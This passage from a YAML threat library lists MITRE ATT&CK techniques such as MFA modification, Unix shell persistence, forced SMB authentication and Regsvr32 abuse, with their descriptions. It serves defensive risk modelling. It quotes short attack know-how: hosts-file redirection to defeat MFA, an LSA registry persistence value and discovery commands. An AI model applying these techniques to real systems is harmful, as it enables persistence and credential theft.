      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018)

      https://attack.mitre.org/techniques/T1110/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027
    ref_id: T1027
    name: Obfuscated Files or Information
    description: "Adversaries may attempt to make an executable or file difficult\
      \ to discover or analyze by encrypting, encoding, or otherwise obfuscating its\
      \ contents on the system or in transit. This is common behavior that can be\
      \ used across different platforms and the network to evade defenses. \n\nPayloads\
      \ may be compressed, archived, or encrypted in order to avoid detection. These\
      \ payloads may be used during Initial Access or later to mitigate detection.\
      \ Sometimes a user's action may be required to open and [Deobfuscate/Decode\
      \ Files or Information](https://attack.mitre.org/techniques/T1140) for [User\
      \ Execution](https://attack.mitre.org/techniques/T1204). The user may also be\
      \ required to input a password to open a password protected compressed/encrypted\
      \ file that was provided by the adversary. (Citation: Volexity PowerDuke November\
      \ 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.\
      \ \n\nPortions of files can also be encoded to hide the plain-text strings that\
      \ would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A\
      \ We Live Security Analysis) Payloads may also be split into separate, seemingly\
      \ benign files that only reveal malicious functionality when reassembled. (Citation:\
      \ Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command\
      \ Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands\
      \ executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
      \ Environment variables, aliases, characters, and other platform/language specific\
      \ semantics can be used to evade signature based detections and application\
      \ control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye\
      \ Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)\n\
      https://attack.mitre.org/techniques/T1027"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.006
    ref_id: T1556.006
    name: Multi-Factor Authentication
    description: "Adversaries may disable or modify multi-factor authentication (MFA)\
      \ mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries\
      \ have gained access to a network by either compromising an account lacking\
      \ MFA or by employing an MFA bypass method such as [Multi-Factor Authentication\
      \ Request Generation](https://attack.mitre.org/techniques/T1621), adversaries\
      \ may leverage their access to modify or completely disable MFA defenses. This\
      \ can be accomplished by abusing legitimate features, such as excluding users\
      \ from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled\
      \ MFA method, or by manually patching MFA programs and configuration files to\
      \ bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD\
      \ Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts\
      \ file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls\
      \ to localhost instead of an MFA server may cause the MFA process to fail. If\
      \ a \"fail open\" policy is in place, any otherwise successful authentication\
      \ attempt may be granted access without enforcing MFA. (Citation: Russians Exploit\
      \ Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals,\
      \ and privileges of the adversary, MFA defenses may be disabled for individual\
      \ accounts or for all accounts tied to a larger group, such as all domain accounts\
      \ in a victim's network environment.(Citation: Russians Exploit Default MFA\
      \ Protocol - CISA March 2022)\nhttps://attack.mitre.org/techniques/T1556/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.002
    ref_id: T1114.002
    name: Remote Email Collection
    description: 'Adversaries may target an Exchange server, Office 365, or Google
      Workspace to collect sensitive information. Adversaries may leverage a user''s
      credentials and interact directly with the Exchange server to acquire information
      from within a network. Adversaries may also access externally facing Exchange
      services, Office 365, or Google Workspace to access email using credentials
      or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413)
      can be used to automate searches for specific keywords.

      https://attack.mitre.org/techniques/T1114/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.004
    ref_id: T1505.004
    name: IIS Components
    description: 'Adversaries may install malicious components that run on Internet
      Information Services (IIS) web servers to establish persistence. IIS provides
      several mechanisms to extend the functionality of the web servers. For example,
      Internet Server Application Programming Interface (ISAPI) extensions and filters
      can be installed to examine and/or modify incoming and outgoing IIS web requests.
      Extensions and filters are deployed as DLL files that export three functions:
      <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>,
      and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also
      be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension
      Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS
      Backdoor 2011)(Citation: Trustwave IIS Module 2013)


      Adversaries may install malicious ISAPI extensions and filters to observe and/or
      modify traffic, execute commands on compromised machines, or proxy command and
      control traffic. ISAPI extensions and filters may have access to all IIS web
      requests and responses. For example, an adversary may abuse these mechanisms
      to modify HTTP responses in order to distribute malicious commands/content to
      previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation:
      Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension
      All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation:
      MMPC ISAPI Filter 2012)


      Adversaries may also install malicious IIS modules to observe and/or modify
      traffic. IIS 7.0 introduced modules that provide the same unrestricted access
      to HTTP requests and responses as ISAPI extensions and filters. IIS modules
      can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET
      application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation:
      Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation:
      ESET IIS Malware 2021)

      https://attack.mitre.org/techniques/T1505/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.001
    ref_id: T1036.001
    name: Invalid Code Signature
    description: 'Adversaries may attempt to mimic features of valid code signatures
      to increase the chance of deceiving a user, analyst, or tool. Code signing provides
      a level of authenticity on a binary from the developer and a guarantee that
      the binary has not been tampered with. Adversaries can copy the metadata and
      signature information from a signed program, then use it as a template for an
      unsigned program. Files with invalid code signatures will fail digital signature
      validation checks, but they may appear more legitimate to users and security
      tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)


      Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity
      will not result in a valid signature.

      https://attack.mitre.org/techniques/T1036/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.006
    ref_id: T1564.006
    name: Run Virtual Instance
    description: 'Adversaries may carry out malicious operations using a virtual instance
      to avoid detection. A wide variety of virtualization technologies exist that
      allow for the emulation of a computer or computing environment. By running malicious
      code inside of a virtual instance, adversaries can hide artifacts associated
      with their behavior from security tools that are unable to monitor activity
      inside the virtual instance. Additionally, depending on the virtual networking
      implementation (ex: bridged adapter), network traffic generated by the virtual
      instance can be difficult to trace back to the compromised host as the IP address
      and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)


      Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop
      the necessary files to run a virtual instance (ex: VirtualBox binaries). After
      running a virtual instance, adversaries may create a shared folder between the
      guest and host with permissions that enable the virtual instance to interact
      with the host file system.(Citation: Sophos Ragnar May 2020)

      https://attack.mitre.org/techniques/T1564/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.014
    ref_id: T1027.014
    name: Polymorphic Code
    description: "Adversaries may utilize polymorphic code (also known as metamorphic\
      \ or mutating code) to evade detection. Polymorphic code is a type of software\
      \ capable of changing its runtime footprint during code execution.(Citation:\
      \ polymorphic-blackberry) With each execution of the software, the code is mutated\
      \ into a different version of itself that achieves the same purpose or objective\
      \ as the original. This functionality enables the malware to evade traditional\
      \ signature-based defenses, such as antivirus and antimalware tools.(Citation:\
      \ polymorphic-sentinelone) \nOther obfuscation techniques can be used in conjunction\
      \ with polymorphic code to accomplish the intended effects, including using\
      \ mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
      \ [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded\
      \ File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation:\
      \ polymorphic-medium)\nhttps://attack.mitre.org/techniques/T1027/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1201
    ref_id: T1201
    name: Password Policy Discovery
    description: 'Adversaries may attempt to access detailed information about the
      password policy used within an enterprise network or cloud environment. Password
      policies are a way to enforce complex passwords that are difficult to guess
      or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This
      information may help the adversary to create a list of common passwords and
      launch dictionary and/or brute force attacks which adheres to the policy (e.g.
      if the minimum password length should be 8, then not trying passwords such as
      ''pass123''; not checking for more than 3-4 passwords per account if the lockout
      is set to 6 as to not lock out accounts).


      Password policies can be set and discovered on Windows, Linux, and macOS systems
      via various command shell utilities such as <code>net accounts (/domain)</code>,
      <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>,
      <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>
      (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password
      Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to discover password policy information (e.g. <code>show
      aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)


      Password policies can be discovered in cloud environments using available APIs
      such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).

      https://attack.mitre.org/techniques/T1201'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546
    ref_id: T1546
    name: Event Triggered Execution
    description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges.

      https://attack.mitre.org/techniques/T1546'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.004
    ref_id: T1546.004
    name: Unix Shell Configuration Modification
    description: "Adversaries may establish persistence through executing malicious\
      \ commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s\
      \ execute several configuration scripts at different points throughout the session\
      \ based on events. For example, when a user opens a command-line interface or\
      \ remotely logs in (such as via SSH) a login shell is initiated. The login shell\
      \ executes scripts from the system (<code>/etc</code>) and the user\u2019s home\
      \ directory (<code>~/</code>) to configure the environment. All login shells\
      \ on a system use /etc/profile when initiated. These configuration scripts run\
      \ at the permission level of their directory and are often used to set environment\
      \ variables, create aliases, and customize the user\u2019s environment. When\
      \ the shell exits or terminates, additional shell scripts are executed to ensure\
      \ the shell exits appropriately. \n\nAdversaries may attempt to establish persistence\
      \ by inserting commands into scripts automatically executed by shells. Using\
      \ bash as an example, the default shell for most GNU/Linux systems, adversaries\
      \ may add commands that launch malicious binaries into the <code>/etc/profile</code>\
      \ and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation:\
      \ bencane blog bashrc) These files typically require root permissions to modify\
      \ and are executed each time any shell on a system launches. For user level\
      \ permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>,\
      \ <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when\
      \ a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:\
      \ Linux manual bash invocation) Since the system only executes the first existing\
      \ file in the listed order, adversaries have used <code>~/.bash_profile</code>\
      \ to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>\
      \ file which is additionally executed if the connection is established remotely\
      \ or an additional interactive shell is opened, such as a new tab in the command-line\
      \ interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:\
      \ Magento) Some malware targets the termination of a program to trigger execution,\
      \ adversaries can use the <code>~/.bash_logout</code> file to execute malicious\
      \ commands at the end of a session. \n\nFor macOS, the functionality of this\
      \ technique is similar but may leverage zsh, the default shell for macOS 10.15+.\
      \ When the Terminal.app is opened, the application launches a zsh login shell\
      \ and a zsh interactive shell. The login shell configures the system environment\
      \ using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,\
      \ and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:\
      \ code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login\
      \ shell then configures the user environment with <code>~/.zprofile</code> and\
      \ <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>\
      \ to configure the user environment. Upon exiting, <code>/etc/zlogout</code>\
      \ and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes\
      \ <code>/etc/bashrc</code> on startup.\nhttps://attack.mitre.org/techniques/T1546/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1187
    ref_id: T1187
    name: Forced Authentication
    description: 'Adversaries may gather credential material by invoking or forcing
      a user to automatically provide authentication information through a mechanism
      in which they can intercept.


      The Server Message Block (SMB) protocol is commonly used in Windows networks
      for authentication and communication between systems for access to resources
      and file sharing. When a Windows system attempts to connect to an SMB resource
      it will automatically attempt to authenticate and send credential information
      for the current user to the remote system. (Citation: Wikipedia Server Message
      Block) This behavior is typical in enterprise environments so that users do
      not need to enter credentials to access network resources.


      Web Distributed Authoring and Versioning (WebDAV) is also typically used by
      Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is
      an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation:
      Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)


      Adversaries may take advantage of this behavior to gain access to user account
      hashes through forced SMB/WebDAV authentication. An adversary can send an attachment
      to a user through spearphishing that contains a resource link to an external
      server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)),
      or place a specially crafted file on navigation path for privileged accounts
      (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed
      by victim(s). When the user''s system accesses the untrusted resource it will
      attempt authentication and send information, including the user''s hashed credentials,
      over SMB to the adversary controlled server. (Citation: GitHub Hashjacking)
      With access to the credential hash, an adversary can perform off-line [Brute
      Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to
      plaintext credentials. (Citation: Cylance Redirect to SMB)


      There are several different ways this can occur. (Citation: Osanda Stealing
      NetNTLM Hashes) Some specifics from in-the-wild use include:


      * A spearphishing attachment containing a document with a resource that is automatically
      loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)).
      The document can include, for example, a request similar to <code>file[:]//[remote
      address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT
      Energy Oct 2017)

      * A modified .LNK or .SCF file with the icon filename pointing to an external
      reference such as <code>\\[remote address]\pic.png</code> that will force the
      system to load the resource when the icon is rendered to repeatedly gather credentials.
      (Citation: US-CERT APT Energy Oct 2017)

      https://attack.mitre.org/techniques/T1187'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.005
    ref_id: T1134.005
    name: SID-History Injection
    description: 'Adversaries may use SID-History Injection to escalate privileges
      and bypass access controls. The Windows security identifier (SID) is a unique
      value that identifies a user or group account. SIDs are used by Windows security
      in both security descriptors and access tokens. (Citation: Microsoft SID) An
      account can hold additional SIDs in the SID-History Active Directory attribute
      (Citation: Microsoft SID-History Attribute), allowing inter-operable account
      migration between domains (e.g., all values in SID-History are included in access
      tokens).


      With Domain Administrator (or equivalent) rights, harvested or well-known SID
      values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History
      to enable impersonation of arbitrary users/groups such as Enterprise Administrators.
      This manipulation may result in elevated access to local resources and/or access
      to otherwise inaccessible domains via lateral movement techniques such as [Remote
      Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002),
      or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).

      https://attack.mitre.org/techniques/T1134/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1599
    ref_id: T1599
    name: Network Boundary Bridging
    description: 'Adversaries may bridge network boundaries by compromising perimeter
      network devices or internal devices responsible for network segmentation. Breaching
      these devices may enable an adversary to bypass restrictions on traffic routing
      that otherwise separate trusted and untrusted networks.


      Devices such as routers and firewalls can be used to create boundaries between
      trusted and untrusted networks.  They achieve this by restricting traffic types
      to enforce organizational policy in an attempt to reduce the risk inherent in
      such connections.  Restriction of traffic can be achieved by prohibiting IP
      addresses, layer 4 protocol ports, or through deep packet inspection to identify
      applications.  To participate with the rest of the network, these devices can
      be directly addressable or transparent, but their mode of operation has no bearing
      on how the adversary can bypass them when compromised.


      When an adversary takes control of such a boundary device, they can bypass its
      policy enforcement to pass normally prohibited traffic across the trust boundary
      between the two separated networks without hinderance.  By achieving sufficient
      rights on the device, an adversary can reconfigure the device to allow the traffic
      they want, allowing them to then further achieve goals such as command and control
      via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration
      of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001).
      Adversaries may also target internal devices responsible for network segmentation
      and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001)
      to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the
      cases where a border device separates two separate organizations, the adversary
      can also facilitate lateral movement into new victim environments.

      https://attack.mitre.org/techniques/T1599'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1486
    ref_id: T1486
    name: Data Encrypted for Impact
    description: "Adversaries may encrypt data on target systems or on large numbers\
      \ of systems in a network to interrupt availability to system and network resources.\
      \ They can attempt to render stored data inaccessible by encrypting files or\
      \ data on local and remote drives and withholding access to a decryption key.\
      \ This may be done in order to extract monetary compensation from a victim in\
      \ exchange for decryption or a decryption key (ransomware) or to render data\
      \ permanently inaccessible in cases where the key is not saved or transmitted.(Citation:\
      \ US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT\
      \ NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware,\
      \ it is typical that common user files like Office documents, PDFs, images,\
      \ videos, audio, text, and source code files will be encrypted (and often renamed\
      \ and/or tagged with specific file markers). Adversaries may need to first employ\
      \ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)\
      \ or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in\
      \ order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack\
      \ Conti July 2020) In some cases, adversaries may encrypt critical system files,\
      \ disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize\
      \ impact on the target organization, malware designed for encrypting data may\
      \ have worm-like features to propagate across a network by leveraging other\
      \ attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),\
      \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows\
      \ Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye\
      \ WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also\
      \ leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001),\
      \ such as changing victim wallpapers, or otherwise intimidate victims by sending\
      \ ransom notes or other messages to connected printers (known as \"print bombing\"\
      ).(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage\
      \ objects within compromised accounts may also be encrypted.(Citation: Rhino\
      \ S3 Ransomware Part 1)\nhttps://attack.mitre.org/techniques/T1486"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553
    ref_id: T1553
    name: Subvert Trust Controls
    description: 'Adversaries may undermine security controls that will either warn
      users of untrusted activity or prevent execution of untrusted programs. Operating
      systems and security products may contain mechanisms to identify programs or
      websites as possessing some level of trust. Examples of such features would
      include a program being allowed to run because it is signed by a valid code
      signing certificate, a program prompting the user with a warning because it
      has an attribute set from being downloaded from the Internet, or getting an
      indication that you are about to connect to an untrusted site.


      Adversaries may attempt to subvert these trust mechanisms. The method adversaries
      use will depend on the specific mechanism they seek to subvert. Adversaries
      may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)
      or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of
      subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017)
      Adversaries may also create or steal code signing certificates to acquire trust
      on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec
      Digital Certificates)

      https://attack.mitre.org/techniques/T1553'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.004
    ref_id: T1548.004
    name: Elevated Execution with Prompt
    description: "Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code>\
      \ API to escalate privileges by prompting the user for credentials.(Citation:\
      \ AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to\
      \ give application developers an easy way to perform operations with root privileges,\
      \ such as for application installation or updating. This API does not validate\
      \ that the program requesting root privileges comes from a reputable source\
      \ or has been maliciously modified. \n\nAlthough this API is deprecated, it\
      \ still fully functions in the latest releases of macOS. When calling this API,\
      \ the user will be prompted to enter their credentials but no checks on the\
      \ origin or integrity of the program are made. The program calling the API may\
      \ also load world writable files which can be modified to perform malicious\
      \ behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code>\
      \ to obtain root privileges in order to install malicious software on victims\
      \ and install persistence mechanisms.(Citation: Death by 1000 installers; it's\
      \ all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot\
      \ RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ to trick the user into granting escalated privileges to malicious code.(Citation:\
      \ Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer\
      \ Feb 2019) This technique has also been shown to work by modifying legitimate\
      \ programs present on the machine that make use of this API.(Citation: Death\
      \ by 1000 installers; it's all broken!)\nhttps://attack.mitre.org/techniques/T1548/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.003
    ref_id: T1592.003
    name: Firmware
    description: 'Adversaries may gather information about the victim''s host firmware
      that can be used during targeting. Information about host firmware may include
      a variety of details such as type and versions on specific hosts, which may
      be used to infer more information about hosts in the environment (ex: configuration,
      purpose, age/patch level, etc.).


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about host firmware may only be exposed to adversaries via online or other accessible
      data sets (ex: job postings, network maps, assessment reports, resumes, or purchase
      invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal
      opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
      or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).

      https://attack.mitre.org/techniques/T1592/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573
    ref_id: T1573
    name: Encrypted Channel
    description: 'Adversaries may employ an encryption algorithm to conceal command
      and control traffic rather than relying on any inherent protections provided
      by a communication protocol. Despite the use of a secure algorithm, these implementations
      may be vulnerable to reverse engineering if secret keys are encoded and/or generated
      within malware samples/configuration files.

      https://attack.mitre.org/techniques/T1573'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.002
    ref_id: T1547.002
    name: Authentication Package
    description: 'Adversaries may abuse authentication packages to execute DLLs when
      the system boots. Windows authentication package DLLs are loaded by the Local
      Security Authority (LSA) process at system start. They provide support for multiple
      logon processes and multiple security protocols to the operating system.(Citation:
      MSDN Authentication Packages)


      Adversaries can use the autostart mechanism provided by LSA authentication packages
      for persistence by placing a reference to a binary in the Windows Registry location
      <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of
      <code>"Authentication Packages"=&lt;target binary&gt;</code>. The binary will
      then be executed by the system when the authentication packages are loaded.

      https://attack.mitre.org/techniques/T1547/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.010
    ref_id: T1218.010
    name: Regsvr32
    description: 'Adversaries may abuse Regsvr32.exe to proxy execution of malicious
      code. Regsvr32.exe is a command-line program used to register and unregister
      object linking and embedding controls, including dynamic link libraries (DLLs),
      on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.
      (Citation: Microsoft Regsvr32)


      Malicious usage of Regsvr32.exe may avoid triggering security tools that may
      not monitor execution of, and modules loaded by, the regsvr32.exe process because
      of allowlists or false positives from Windows using regsvr32.exe for normal
      operations. Regsvr32.exe can also be used to specifically bypass application
      control using functionality to load COM scriptlets to execute DLLs under user
      permissions. Since Regsvr32.exe is network and proxy aware, the scripts can
      be loaded by passing a uniform resource locator (URL) to file on an external
      Web server as an argument during invocation. This method makes no changes to
      the Registry as the COM object is not actually registered, only executed. (Citation:
      LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo"
      and has been used in campaigns targeting governments. (Citation: Carbon Black
      Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)


      Regsvr32.exe can also be leveraged to register a COM Object used to establish
      persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015).
      (Citation: Carbon Black Squiblydoo Apr 2016)

      https://attack.mitre.org/techniques/T1218/010'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.003
    ref_id: T1567.003
    name: Exfiltration to Text Storage Sites
    description: "Adversaries may exfiltrate data to text storage sites instead of\
      \ their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>,\
      \ are commonly used by developers to share code and other information.  \n\n\
      Text storage sites are often used to host malicious code for C2 communication\
      \ (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but\
      \ adversaries may also use these sites to exfiltrate collected data. Furthermore,\
      \ paid features and encryption options may allow adversaries to conceal and\
      \ store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is\
      \ distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001),\
      \ which highlight access to code repositories via APIs.\nhttps://attack.mitre.org/techniques/T1567/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.002
    ref_id: T1592.002
    name: Software
    description: 'Adversaries may gather information about the victim''s host software
      that can be used during targeting. Information about installed software may
      include a variety of details such as types and versions on specific hosts, as
      well as the presence of additional components that might be indicative of added
      defensive protections (ex: antivirus, SIEMs, etc.).


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex:
      listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then include malicious content designed
      to collect host information from visitors.(Citation: ATT ScanBox) Information
      about the installed software may also be exposed to adversaries via online or
      other accessible data sets (ex: job postings, network maps, assessment reports,
      resumes, or purchase invoices). Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
      or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1592/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056
    ref_id: T1056
    name: Input Capture
    description: 'Adversaries may use methods of capturing user input to obtain credentials
      or collect information. During normal system usage, users often provide credentials
      to various different locations, such as login pages/portals or system dialog
      boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential
      API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving
      the user into providing input into what they believe to be a genuine service
      (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).

      https://attack.mitre.org/techniques/T1056'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.004
    ref_id: T1566.004
    name: Spearphishing Voice
    description: 'Adversaries may use voice communications to ultimately gain access
      to victim systems. Spearphishing voice is a specific variant of spearphishing.
      It is different from other forms of spearphishing in that is employs the use
      of manipulating a user into providing access to systems through a phone call
      or other forms of voice communications. Spearphishing frequently involves social
      engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656))
      and/or creating a sense of urgency or alarm for the recipient.


      All forms of phishing are electronically delivered social engineering. In this
      scenario, adversaries are not directly sending malware to a victim vice relying
      on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery
      and execution. For example, victims may receive phishing messages that instruct
      them to call a phone number where they are directed to visit a malicious URL,
      download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring
      and Management Software) or install adversary-accessible remote management tools
      ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their
      computer.(Citation: Unit42 Luna Moth)


      Adversaries may also combine voice phishing with [Multi-Factor Authentication
      Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick
      users into divulging MFA credentials or accepting authentication prompts.(Citation:
      Proofpoint Vishing)

      https://attack.mitre.org/techniques/T1566/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.004
    ref_id: T1587.004
    name: Exploits
    description: 'Adversaries may develop exploits that can be used during targeting.
